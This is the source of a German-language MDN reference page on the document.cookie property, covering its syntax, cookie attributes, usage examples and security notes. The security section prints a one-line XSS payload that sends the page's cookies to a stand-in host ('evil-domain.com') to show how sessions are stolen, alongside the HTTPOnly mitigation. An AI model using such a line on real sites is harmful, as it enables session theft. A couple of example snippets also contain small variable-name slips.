---
title: "Dokument: Cookie-Eigenschaft"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: 3e543cdfe8dddfb4774a64bf3decdcbab42a4111
---

{{APIRef("DOM")}}

Die [`Document`](/de/docs/Web/API/Document)-Eigenschaft `cookie` ermöglicht es Ihnen, [Cookies](/de/docs/Web/HTTP/Guides/Cookies) zu lesen und zu schreiben, die mit dem Dokument verbunden sind. Sie dient als Getter und Setter für die tatsächlichen Werte der Cookies.

## Syntax

### Lesen aller von diesem Standort zugänglichen Cookies

```js
allCookies = document.cookie;
```

Im obigen Code ist `allCookies` eine Zeichenkette, die eine durch Semikolon getrennte Liste aller Cookies (d.h. `key=value`-Paare) enthält. Beachten Sie, dass jedes _key_ und _value_ von Leerzeichen (Leerzeichen und Tabulatorzeichen) umgeben sein kann: Tatsächlich schreibt {{RFC(6265)}} ein einzelnes Leerzeichen nach jedem Semikolon vor, aber einige Benutzeragenten halten sich möglicherweise nicht daran.

### Schreiben eines neuen Cookies

```js
document.cookie = newCookie;
```

Im obigen Code ist `newCookie` eine Zeichenkette der Form `key=value`, die das zu setzende/aktualisierende Cookie angibt. Beachten Sie, dass Sie mit dieser Methode nur ein einziges Cookie auf einmal setzen/aktualisieren können. Beachten Sie auch, dass:

- Jeder der folgenden Cookie-Attributwerte optional auf das Key-Value-Paar folgen kann, jeweils mit einem Semikolon getrennt:

  - `;domain=domain` (z.B. `example.com` oder `subdomain.example.com`): Der Host, an den das Cookie gesendet wird.
    Wenn nicht angegeben, standardmäßig auf den Hostteil des aktuellen Dokumentstandorts und das Cookie ist auf Subdomains nicht verfügbar.
    Wenn eine Domain angegeben ist, sind Subdomains immer eingeschlossen.
    Im Gegensatz zu früheren Spezifikationen werden führende Punkte in Domain-Namen ignoriert, aber Browser können das Setzen von Cookies mit solchen Punkten ablehnen.

    > [!NOTE]
    > Die Domain _muss_ mit der Domain des JavaScript-Ursprungs übereinstimmen.
    > Das Setzen von Cookies auf fremde Domains wird stillschweigend ignoriert.

  - `;expires=date-in-UTCString-format`: Das Ablaufdatum des Cookies. Wenn weder `expires` noch `max-age` angegeben sind, läuft es am Ende der Sitzung ab.

    > [!WARNING]
    > Wenn der Schutz der Privatsphäre der Nutzer von Bedeutung ist, ist es wichtig, dass jede Web-App-Implementierung Cookie-Daten nach einer bestimmten Zeitspanne ungültig macht, anstatt sich darauf zu verlassen, dass der Browser dies tut.
    > Viele Browser erlauben es den Nutzern anzugeben, dass Cookies niemals ablaufen sollten, was nicht unbedingt sicher ist.

    Siehe {{jsxref("Date.toUTCString()")}} für Hilfe bei der Formatierung dieses Wertes.

  - `;max-age=max-age-in-seconds`: Das maximale Alter des Cookies in Sekunden (z.B. `60*60*24*365` oder 31536000 für ein Jahr).

  - `;partitioned`: Gibt an, dass das Cookie mit partitioniertem Speicher gespeichert werden soll. Weitere Details finden Sie unter [Cookies Having Independent Partitioned State (CHIPS)](/de/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies).

  - `;path=path`: Der Wert des `Path`-Attributs des Cookies (siehe [Wo Cookies gesendet werden](/de/docs/Web/HTTP/Guides/Cookies#define_where_cookies_are_sent) für weitere Informationen).

  - `;samesite`: Das `SameSite`-Attribut eines {{httpheader("Set-Cookie")}} Headers kann von einem Server gesetzt werden, um anzugeben, wann das Cookie gesendet wird. Mögliche Werte sind `lax`, `strict` oder `none` (siehe auch [Steuerung von Drittanbieter-Cookies mit `SameSite`](/de/docs/Web/HTTP/Guides/Cookies#controlling_third-party_cookies_with_samesite)).

    - Der `lax`-Wert sendet das Cookie für alle gleichnamigen Anfragen und GET-Anfragen der obersten Navigationsebene.
      Dies ist ausreichend für die Nutzerverfolgung, verhindert jedoch viele {{Glossary("CSRF", "Cross-Site Request Forgery")}} (CSRF)-Angriffe.
      Dies ist der Standardwert in modernen Browsern.
    - Der `strict`-Wert verhindert, dass das Browser das Cookie an die Zielsite in allen kontextübergreifenden Browsing-Szenarien sendet, selbst wenn ein normaler Link verfolgt wird.
    - Der `none`-Wert gibt ausdrücklich an, dass keine Einschränkungen angewendet werden. Das Cookie wird in allen Anfragen gesendet—sowohl zwischen verschiedenen als auch gleichen Sites.

  - `;secure`: Gibt an, dass das Cookie nur über ein sicheres Protokoll übertragen werden soll.

- Der Cookie-Wert-String kann {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} verwenden, um sicherzustellen, dass der String keine Kommata, Semikolons oder Leerzeichen enthält (die in Cookie-Werten nicht erlaubt sind).
- Einige User-Agent-Implementierungen unterstützen die folgenden Cookie-Präfixe:

  - `__Secure-` Zeigt dem Browser an, dass es das Cookie nur in Anfragen über einen sicheren Kanal einschließen soll.
  - `__Host-` Zeigt dem Browser an, dass zusätzlich zur Einschränkung der Verwendung des Cookies von einem sicheren Ursprung der Geltungsbereich des Cookies auf ein vom Server übergebenes Pfadattribut beschränkt ist.
    Wenn der Server das Pfadattribut weglässt, wird das "Verzeichnis" der Anforderungs-URI verwendet.
    Es signalisiert auch, dass das Domainattribut nicht vorhanden sein darf, was verhindert, dass das Cookie an andere Domains gesendet wird.
    Für Chrome muss das Pfadattribut immer der Ursprung sein.

  > [!NOTE]
  > Der Bindestrich wird als Teil des Präfixes betrachtet.

  > [!NOTE]
  > Diese Flags können nur mit dem `secure`-Attribut gesetzt werden.

> [!NOTE]
> Wie Sie aus dem obigen Code sehen können, ist `document.cookie` eine [Zugriffseigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit nativen _Setter_- und _Getter_-Funktionen und ist folglich _keine_ [Dateneigenschaft](/de/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) mit einem Wert: Was Sie schreiben, ist nicht dasselbe wie das, was Sie lesen, alles wird immer vom JavaScript-Interpreter vermittelt.

## Beispiele

### Beispiel 1: Einfache Verwendung

```html
<button id="show">Show cookies</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
cleanBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}

### Beispiel 2: Ein Beispiel-Cookie namens test2 erhalten

```html
<button id="show">Show cookie value</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 72)}}

### Beispiel 3: Etwas nur einmal tun

Um den folgenden Code zu verwenden, ersetzen Sie bitte alle Vorkommen des Wortes `doSomethingOnlyOnce` (den Namen des Cookies) durch einen benutzerdefinierten Namen.

```html
<button id="do-once">Only do something once</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Do something here!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 72)}}

### Beispiel 4: Zurücksetzen des vorherigen Cookies

```html
<button id="reset">Reset only once cookie</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // Note that we are setting `SameSite=None;` in this example because the example
  // needs to work cross-origin.
  // It is more common not to set the `SameSite` attribute, which results in the default,
  // and more secure, value of `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 72)}}

### Beispiel 5: Überprüfen der Existenz eines Cookies

```html
<button id="check">Check a cookie exists</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> The cookie "reader" exists';
  } else {
    output.textContent = '> The cookie "reader" does not exist';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_5_Check_a_cookie_existence', 200, 72)}}

### Beispiel 6: Überprüfen, ob ein Cookie einen bestimmten Wert hat

```html
<button id="check">Check that a cookie has a specific value</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> The cookie "reader" has a value of "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample('Example_6_Check_that_a_cookie_has_a_specific_value', 200, 72)}}

## Sicherheit

Es ist wichtig zu erwähnen, dass das `path`-Attribut _nicht_ gegen unbefugtes Lesen des Cookies von einem anderen Pfad schützt. Es kann leicht über das DOM umgangen werden, zum Beispiel durch das Erstellen eines versteckten {{HTMLElement("iframe")}}-Elements mit dem Pfad des Cookies und anschließendem Zugriff auf die Eigenschaft `contentDocument.cookie` dieses iframes. Der einzige Weg, das Cookie zu schützen, ist die Verwendung einer anderen Domain oder Subdomain, aufgrund der [Same-Origin-Policy](/de/docs/Web/Security/Same-origin_policy).

Cookies werden oft in Webanwendungen verwendet, um einen Benutzer und seine authentifizierte Sitzung zu identifizieren. Der Diebstahl eines Cookies von einer Webanwendung führt zu einer Übernahme der authentifizierten Sitzung des Benutzers. Häufige Methoden, um Cookies zu stehlen, umfassen [Social Engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) oder die Ausnutzung einer {{Glossary("Cross-site_scripting", "Cross-Site-Scripting")}} (XSS)-Schwachstelle in der Anwendung -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

Das `HTTPOnly`-Cookie-Attribut kann helfen, diesen Angriff zu mildern, indem es den Zugriff auf den Cookie-Wert über JavaScript verhindert. Lesen Sie mehr über [Cookies und Sicherheit](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Anmerkungen

- Ab Firefox 2 steht ein besserer Mechanismus für die clientseitige Speicherung zur Verfügung - [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API).
- Sie können ein Cookie löschen, indem Sie seine Ablaufzeit auf null setzen.
- Beachten Sie, dass je mehr Cookies Sie haben, desto mehr Daten zwischen dem Server und dem Client für jede Anfrage übertragen werden. Dies verlangsamt jede Anfrage. Es wird Ihnen dringend empfohlen, [WHATWG DOM Storage](/de/docs/Web/API/Web_Storage_API) zu verwenden, wenn Sie "nur clientseitige" Daten behalten möchten.
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965) (Abschnitt 5.3, "Implementation Limits") gibt an, dass es **kein maximales Limit** für die Größe des Schlüssel- oder Wertumfangs eines Cookies geben sollte, und ermutigt Implementierungen, **beliebig große Cookies** zu unterstützen. Das maximale Implementierungslimit jedes Browsers wird zwangsläufig unterschiedlich sein, konsultieren Sie daher die jeweilige Browserdokumentation.

Der Grund für die [Syntax](#syntax) der `document.cookie`-Zugriffseigenschaft liegt in der Client-Server-Natur von Cookies, die sich von anderen Client-Client-Speichermethoden (wie zum Beispiel [localStorage](/de/docs/Web/API/Web_Storage_API)) unterscheidet:

### Der Server teilt dem Client mit, ein Cookie zu speichern

```bash
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

### Der Client sendet die zuvor gespeicherten Cookies an den Server zurück

```bash
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [HTTP-Cookies](/de/docs/Web/HTTP/Guides/Cookies)
- [DOM Storage](/de/docs/Web/API/Web_Storage_API)
- [`URL.pathname`](/de/docs/Web/API/URL/pathname)
- {{jsxref("Date.toUTCString()")}}
- [RFC 2965](https://datatracker.ietf.org/doc/html/rfc2965)
